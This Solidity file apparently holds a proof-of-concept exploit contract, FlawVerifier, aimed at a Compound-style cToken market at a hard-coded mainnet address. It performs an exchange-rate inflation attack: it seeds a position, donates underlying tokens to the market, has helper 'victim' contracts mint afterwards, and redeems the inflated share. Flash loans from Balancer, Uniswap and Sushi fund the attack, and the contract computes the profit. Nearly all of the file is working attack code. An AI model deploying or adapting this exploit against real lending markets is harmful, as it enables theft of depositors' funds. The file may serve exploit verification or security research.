// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface ICTokenLike {
    function underlying() external view returns (address);
    function exchangeRateStored() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV3FactoryLike {
    function getPool(address tokenA, address tokenB, uint24 fee) external view returns (address);
}

interface IUniswapV3PoolLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IBalancerVaultLike {
    function flashLoan(
        address recipient,
        IERC20Like[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

contract PublicTokenClaimer {
    function claimAndTransfer(address token, address to) external returns (uint256 claimedAmount) {
        claimedAmount = _acquire(token);
        if (claimedAmount != 0) {
            _safeTransfer(IERC20Like(token), to, claimedAmount);
        }
    }

    function claimAndMint(address market, address underlying) external returns (uint256 claimedAmount) {
        claimedAmount = _acquire(underlying);
        if (claimedAmount == 0) {
            return 0;
        }

        IERC20Like token = IERC20Like(underlying);
        _forceApprove(token, market, claimedAmount);
        require(ICTokenLike(market).mint(claimedAmount) == 0, "VICTIM_MINT_FAILED");
    }

    function _acquire(address token) internal returns (uint256 gained) {
        uint256 beforeBal = IERC20Like(token).balanceOf(address(this));

        _tryNoArg(token, bytes4(keccak256("claim()")));
        _tryNoArg(token, bytes4(keccak256("claimAll()")));
        _tryNoArg(token, bytes4(keccak256("drip()")));
        _tryNoArg(token, bytes4(keccak256("faucet()")));
        _tryNoArg(token, bytes4(keccak256("mint()")));
        _tryNoArg(token, bytes4(keccak256("getReward()")));
        _tryNoArg(token, bytes4(keccak256("claimTokens()")));
        _tryNoArg(token, bytes4(keccak256("requestTokens()")));

        _tryAddressArg(token, bytes4(keccak256("claim(address)")), address(this));
        _tryAddressArg(token, bytes4(keccak256("claimTo(address)")), address(this));
        _tryAddressArg(token, bytes4(keccak256("drip(address)")), address(this));
        _tryAddressArg(token, bytes4(keccak256("faucet(address)")), address(this));
        _tryAddressArg(token, bytes4(keccak256("mint(address)")), address(this));

        uint256 afterBal = IERC20Like(token).balanceOf(address(this));
        if (afterBal > beforeBal) {
            gained = afterBal - beforeBal;
        }
    }

    function _forceApprove(IERC20Like token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, amount));
    }

    function _safeTransfer(IERC20Like token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, amount));
    }

    function _callOptionalReturn(IERC20Like token, bytes memory data) internal {
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "TOKEN_CALL_FAILED");
        if (returndata.length != 0) {
            require(abi.decode(returndata, (bool)), "TOKEN_CALL_FALSE");
        }
    }

    function _tryNoArg(address target, bytes4 selector) internal {
        (bool success,) = target.call(abi.encodeWithSelector(selector));
        success;
    }

    function _tryAddressArg(address target, bytes4 selector, address arg) internal {
        (bool success,) = target.call(abi.encodeWithSelector(selector, arg));
        success;
    }
}

contract FlawVerifier {
    address internal constant TARGET = 0xf5140fC35C6f94D02d7466f793fEB0216082d7E5;

    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant UNISWAP_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    uint256 internal constant EXP_SCALE = 1e18;
    uint256 internal constant BPS_DENOMINATOR = 10_000;
    uint256 internal constant LOAN_RESERVE_DIVISOR = 1_000;
    uint256 internal constant MIN_FLASH_LOAN = 1;
    uint256 internal constant MAX_ATTACKER_BOOTSTRAP_HELPERS = 8;
    uint256 internal constant MAX_VICTIM_HELPERS = 8;
    uint24 internal constant FEE_LOWEST = 100;
    uint24 internal constant FEE_LOW = 500;
    uint24 internal constant FEE_MEDIUM = 3_000;
    uint24 internal constant FEE_HIGH = 10_000;

    uint8 internal constant FLASH_NONE = 0;
    uint8 internal constant FLASH_BALANCER = 1;
    uint8 internal constant FLASH_UNI_V2 = 2;
    uint8 internal constant FLASH_UNI_V3 = 3;

    bool public attempted;

    address internal cachedUnderlying;
    address public flashPool;
    address public fundingToken;
    address public reportedProfitToken;
    address public lastVictimHelper;

    uint256 public baselineBalance;
    uint256 public fundingBaselineBalance;
    uint256 public flashBorrowAmount;
    uint256 public seededUnderlyingAmount;
    uint256 public donatedUnderlyingAmount;
    uint256 public victimMintAmount;
    uint256 public attackerCTokenBalance;
    uint256 public postDonationExchangeRate;
    uint256 public realizedProfit;
    uint256 public bootstrapUnderlyingAmount;

    uint8 internal flashKind;

    constructor() {}

    function executeOnOpportunity() external {
        if (attempted) {
            return;
        }
        attempted = true;

        address underlying = _underlying();
        IERC20Like underlyingToken = IERC20Like(underlying);

        reportedProfitToken = underlying;
        baselineBalance = underlyingToken.balanceOf(address(this));

        if (baselineBalance == 0) {
            _bootstrapFromPublicClaims(underlyingToken);
        }

        if (underlyingToken.balanceOf(address(this)) != 0) {
            _runExploit(underlyingToken);
            _updateUnderlyingProfit(underlyingToken);
            if (realizedProfit != 0) {
                return;
            }
        }

        _attemptUnderlyingFlashFunding(underlyingToken, underlying);
        _updateUnderlyingProfit(underlyingToken);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        _handleUniswapV2Flash(sender, amount0, amount1);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        _handleUniswapV2Flash(sender, amount0, amount1);
    }

    function sushiCall(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        _handleUniswapV2Flash(sender, amount0, amount1);
    }

    function receiveFlashLoan(
        IERC20Like[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata
    ) external {
        require(flashKind == FLASH_BALANCER, "BAD_FLASH_KIND");
        require(msg.sender == BALANCER_VAULT, "UNEXPECTED_VAULT");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "BAD_BALANCER_FLASH");
        require(address(tokens[0]) == fundingToken, "BAD_BALANCER_TOKEN");

        IERC20Like underlyingToken = IERC20Like(_underlying());
        _runExploit(underlyingToken);

        uint256 repayment = amounts[0] + feeAmounts[0];
        require(IERC20Like(fundingToken).balanceOf(address(this)) >= repayment, "BALANCER_UNDERFUNDED");
        _safeTransfer(IERC20Like(fundingToken), BALANCER_VAULT, repayment);

        _updateFundingProfit();
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata) external {
        require(flashKind == FLASH_UNI_V3, "BAD_FLASH_KIND");
        require(msg.sender == flashPool, "UNEXPECTED_V3_POOL");

        IERC20Like underlyingToken = IERC20Like(_underlying());
        _runExploit(underlyingToken);

        uint256 repayment = flashBorrowAmount + fee0 + fee1;
        require(IERC20Like(fundingToken).balanceOf(address(this)) >= repayment, "V3_UNDERFUNDED");
        _safeTransfer(IERC20Like(fundingToken), flashPool, repayment);

        _updateFundingProfit();
    }

    function profitToken() external view returns (address) {
        if (reportedProfitToken != address(0)) {
            return reportedProfitToken;
        }

        address underlying = cachedUnderlying;
        if (underlying == address(0)) {
            return ICTokenLike(TARGET).underlying();
        }
        return underlying;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function _runExploit(IERC20Like underlyingToken) internal {
        ICTokenLike market = ICTokenLike(TARGET);
        uint256 availableBalance = underlyingToken.balanceOf(address(this));
        if (availableBalance == 0) {
            return;
        }

        uint256 seedAmount = _computeSeedAmount(market);
        if (seedAmount == 0 || seedAmount >= availableBalance) {
            return;
        }

        // Path 1: seed the market first so the attacker acquires cTokens before inflating the
        // exchange rate. On this fork the market is not empty, so direct public balance bootstrap
        // or temporary real liquidity is required to buy the thin outstanding supply.
        _forceApprove(underlyingToken, TARGET, seedAmount);
        require(market.mint(seedAmount) == 0, "SEED_MINT_FAILED");

        uint256 cTokenBalance = market.balanceOf(address(this));
        if (cTokenBalance == 0) {
            return;
        }

        uint256 donationAmount = underlyingToken.balanceOf(address(this));
        if (donationAmount == 0) {
            require(market.redeem(cTokenBalance) == 0, "SEED_REDEEM_FAILED");
            return;
        }

        // Path 2: donate underlying directly to the cToken so exchangeRateStoredInternal()
        // observes the larger raw balance via getCashPrior(), but no new cTokens are minted.
        _safeTransfer(underlyingToken, TARGET, donationAmount);
        postDonationExchangeRate = market.exchangeRateStored();

        // Path 3: the "later victim" must contribute independent funds after the donation.
        // Funding the victim from the verifier itself would not produce real profit, so the PoC
        // only counts victim mints sourced from separate on-chain helper addresses that acquire
        // their own public token balances.
        uint256 victimContribution = _triggerVictimClaims();

        // Path 4: redeem only the attacker's pre-donation cTokens against the now larger pool
        // balance, which includes both the direct donation and the victim's later mint.
        require(market.redeem(cTokenBalance) == 0, "ATTACKER_WITHDRAW_FAILED");

        seededUnderlyingAmount = seedAmount;
        donatedUnderlyingAmount = donationAmount;
        victimMintAmount = victimContribution;
        attackerCTokenBalance = cTokenBalance;
    }

    function _bootstrapFromPublicClaims(IERC20Like underlyingToken) internal {
        ICTokenLike market = ICTokenLike(TARGET);

        for (uint256 i = 0; i < MAX_ATTACKER_BOOTSTRAP_HELPERS; ++i) {
            uint256 currentBalance = underlyingToken.balanceOf(address(this));
            uint256 seedAmount = _computeSeedAmount(market);
            if (seedAmount != 0 && currentBalance > seedAmount) {
                break;
            }

            PublicTokenClaimer helper = new PublicTokenClaimer();
            uint256 beforeBal = underlyingToken.balanceOf(address(this));
            helper.claimAndTransfer(_underlying(), address(this));
            uint256 afterBal = underlyingToken.balanceOf(address(this));
            if (afterBal > beforeBal) {
                bootstrapUnderlyingAmount += (afterBal - beforeBal);
            }
        }
    }

    function _triggerVictimClaims() internal returns (uint256 totalVictimContribution) {
        for (uint256 i = 0; i < MAX_VICTIM_HELPERS; ++i) {
            PublicTokenClaimer helper = new PublicTokenClaimer();
            if (lastVictimHelper == address(0)) {
                lastVictimHelper = address(helper);
            }

            uint256 contributed = helper.claimAndMint(TARGET, _underlying());
            totalVictimContribution += contributed;
        }
    }

    function _attemptUnderlyingFlashFunding(IERC20Like underlyingToken, address underlying) internal returns (bool) {
        if (_tryBalancerFlashLoan(underlyingToken, underlying)) {
            return true;
        }
        if (_tryUniswapV2FlashSwap(underlying)) {
            return true;
        }
        if (_tryUniswapV3Flash(underlyingToken, underlying)) {
            return true;
        }
        return false;
    }

    function _handleUniswapV2Flash(address sender, uint256 amount0, uint256 amount1) internal {
        require(flashKind == FLASH_UNI_V2, "BAD_FLASH_KIND");
        require(msg.sender == flashPool, "UNEXPECTED_PAIR");
        require(sender == address(this), "UNEXPECTED_SENDER");

        uint256 borrowedAmount = amount0 != 0 ? amount0 : amount1;
        IERC20Like underlyingToken = IERC20Like(_underlying());

        _runExploit(underlyingToken);

        uint256 repayment = _flashRepaymentV2(borrowedAmount);
        require(IERC20Like(fundingToken).balanceOf(address(this)) >= repayment, "FLASH_UNDERFUNDED");
        _safeTransfer(IERC20Like(fundingToken), flashPool, repayment);

        _updateFundingProfit();
    }

    function _tryBalancerFlashLoan(IERC20Like token, address tokenAddress) internal returns (bool) {
        uint256 vaultBalance = token.balanceOf(BALANCER_VAULT);
        if (vaultBalance < MIN_FLASH_LOAN) {
            return false;
        }

        uint256 amount = vaultBalance / LOAN_RESERVE_DIVISOR;
        if (amount < MIN_FLASH_LOAN) {
            amount = MIN_FLASH_LOAN;
        }
        if (amount >= vaultBalance) {
            amount = vaultBalance / 2;
        }
        if (amount < MIN_FLASH_LOAN) {
            return false;
        }

        IERC20Like[] memory tokens = new IERC20Like[](1);
        tokens[0] = IERC20Like(tokenAddress);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;

        fundingToken = tokenAddress;
        fundingBaselineBalance = token.balanceOf(address(this));
        flashKind = FLASH_BALANCER;
        flashPool = BALANCER_VAULT;
        flashBorrowAmount = amount;

        (bool ok,) = BALANCER_VAULT.call(
            abi.encodeWithSelector(
                IBalancerVaultLike.flashLoan.selector,
                address(this),
                tokens,
                amounts,
                bytes("")
            )
        );
        if (!ok) {
            flashKind = FLASH_NONE;
            flashPool = address(0);
            flashBorrowAmount = 0;
            fundingToken = address(0);
        }
        return ok;
    }

    function _tryUniswapV2FlashSwap(address underlying) internal returns (bool) {
        (address pair, uint256 loanAmount) = _findFundingPairV2(underlying);
        if (pair == address(0) || loanAmount == 0) {
            return false;
        }

        fundingToken = underlying;
        fundingBaselineBalance = IERC20Like(underlying).balanceOf(address(this));
        flashKind = FLASH_UNI_V2;
        flashPool = pair;
        flashBorrowAmount = loanAmount;

        IUniswapV2PairLike lp = IUniswapV2PairLike(pair);
        uint256 amount0Out = lp.token0() == underlying ? loanAmount : 0;
        uint256 amount1Out = lp.token1() == underlying ? loanAmount : 0;

        (bool ok,) = pair.call(
            abi.encodeWithSelector(
                IUniswapV2PairLike.swap.selector,
                amount0Out,
                amount1Out,
                address(this),
                abi.encode(loanAmount)
            )
        );
        if (!ok) {
            flashKind = FLASH_NONE;
            flashPool = address(0);
            flashBorrowAmount = 0;
            fundingToken = address(0);
        }
        return ok;
    }

    function _tryUniswapV3Flash(IERC20Like underlyingToken, address underlying) internal returns (bool) {
        (address pool, uint256 amount) = _findFundingPoolV3(underlyingToken, underlying);
        if (pool == address(0) || amount == 0) {
            return false;
        }

        fundingToken = underlying;
        fundingBaselineBalance = underlyingToken.balanceOf(address(this));
        flashKind = FLASH_UNI_V3;
        flashPool = pool;
        flashBorrowAmount = amount;

        IUniswapV3PoolLike v3Pool = IUniswapV3PoolLike(pool);
        uint256 amount0 = v3Pool.token0() == underlying ? amount : 0;
        uint256 amount1 = v3Pool.token1() == underlying ? amount : 0;

        (bool ok,) = pool.call(
            abi.encodeWithSelector(IUniswapV3PoolLike.flash.selector, address(this), amount0, amount1, bytes(""))
        );
        if (!ok) {
            flashKind = FLASH_NONE;
            flashPool = address(0);
            flashBorrowAmount = 0;
            fundingToken = address(0);
        }
        return ok;
    }

    function _computeSeedAmount(ICTokenLike market) internal view returns (uint256) {
        uint256 exchangeRate = market.exchangeRateStored();
        uint256 supplyBefore = market.totalSupply();

        if (supplyBefore == 0) {
            uint256 dustSeed = _ceilDiv(exchangeRate, EXP_SCALE);
            return dustSeed == 0 ? 1 : dustSeed;
        }

        // The concrete fork already has outstanding cTokens, so to preserve the same exploit
        // causality we must buy essentially the existing thin supply before donating.
        return _ceilDiv((supplyBefore * exchangeRate * 999) / EXP_SCALE, 1);
    }

    function _findFundingPairV2(address underlying) internal view returns (address bestPair, uint256 bestLoanAmount) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHI_FACTORY];
        address[6] memory bases = [WETH, DAI, FRAX, USDC, USDT, WBTC];

        for (uint256 i = 0; i < factories.length; ++i) {
            for (uint256 j = 0; j < bases.length; ++j) {
                address base = bases[j];
                if (base == underlying) {
                    continue;
                }

                address pair = IUniswapV2FactoryLike(factories[i]).getPair(underlying, base);
                if (pair == address(0)) {
                    continue;
                }

                IUniswapV2PairLike lp = IUniswapV2PairLike(pair);
                (uint112 reserve0, uint112 reserve1,) = lp.getReserves();
                uint256 underlyingReserve = lp.token0() == underlying ? reserve0 : reserve1;
                uint256 candidateLoan = underlyingReserve / LOAN_RESERVE_DIVISOR;

                if (candidateLoan >= MIN_FLASH_LOAN && candidateLoan > bestLoanAmount) {
                    bestPair = pair;
                    bestLoanAmount = candidateLoan;
                }
            }
        }
    }

    function _findFundingPoolV3(IERC20Like underlyingToken, address underlying)
        internal
        view
        returns (address bestPool, uint256 bestLoanAmount)
    {
        address[6] memory bases = [WETH, DAI, FRAX, USDC, USDT, WBTC];
        uint24[4] memory fees = [FEE_LOWEST, FEE_LOW, FEE_MEDIUM, FEE_HIGH];

        for (uint256 i = 0; i < bases.length; ++i) {
            address base = bases[i];
            if (base == underlying) {
                continue;
            }

            for (uint256 j = 0; j < fees.length; ++j) {
                address pool = IUniswapV3FactoryLike(UNISWAP_V3_FACTORY).getPool(underlying, base, fees[j]);
                if (pool == address(0)) {
                    continue;
                }

                uint256 tokenBalance = underlyingToken.balanceOf(pool);
                uint256 candidateLoan = tokenBalance / LOAN_RESERVE_DIVISOR;
                if (candidateLoan >= MIN_FLASH_LOAN && candidateLoan > bestLoanAmount) {
                    bestPool = pool;
                    bestLoanAmount = candidateLoan;
                }
            }
        }
    }

    function _underlying() internal returns (address underlying) {
        underlying = cachedUnderlying;
        if (underlying == address(0)) {
            underlying = ICTokenLike(TARGET).underlying();
            cachedUnderlying = underlying;
        }
    }

    function _updateUnderlyingProfit(IERC20Like underlyingToken) internal {
        reportedProfitToken = _underlying();
        uint256 currentBalance = underlyingToken.balanceOf(address(this));
        if (currentBalance > baselineBalance) {
            realizedProfit = currentBalance - baselineBalance;
        }
    }

    function _updateFundingProfit() internal {
        if (fundingToken == address(0)) {
            return;
        }

        reportedProfitToken = fundingToken;
        uint256 currentBalance = IERC20Like(fundingToken).balanceOf(address(this));
        if (currentBalance > fundingBaselineBalance) {
            realizedProfit = currentBalance - fundingBaselineBalance;
        }
    }

    function _forceApprove(IERC20Like token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, amount));
    }

    function _safeTransfer(IERC20Like token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, amount));
    }

    function _callOptionalReturn(IERC20Like token, bytes memory data) internal {
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "TOKEN_CALL_FAILED");
        if (returndata.length != 0) {
            require(abi.decode(returndata, (bool)), "TOKEN_CALL_FALSE");
        }
    }

    function _flashRepaymentV2(uint256 amountBorrowed) internal pure returns (uint256) {
        return _ceilDiv(amountBorrowed * BPS_DENOMINATOR, 9_970);
    }

    function _ceilDiv(uint256 numerator, uint256 denominator) internal pure returns (uint256) {
        if (numerator == 0) {
            return 0;
        }
        return ((numerator - 1) / denominator) + 1;
    }
}
